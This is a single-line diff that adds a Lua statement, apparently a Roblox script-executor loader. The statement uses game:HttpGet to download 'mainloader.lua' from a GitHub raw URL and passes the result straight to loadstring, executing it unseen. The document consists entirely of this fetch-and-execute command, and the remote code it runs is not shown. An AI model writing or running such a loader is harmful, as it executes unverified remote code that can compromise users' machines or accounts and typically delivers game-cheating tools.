@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xsheed/loader/refs/heads/main/mainloader.lua"))()
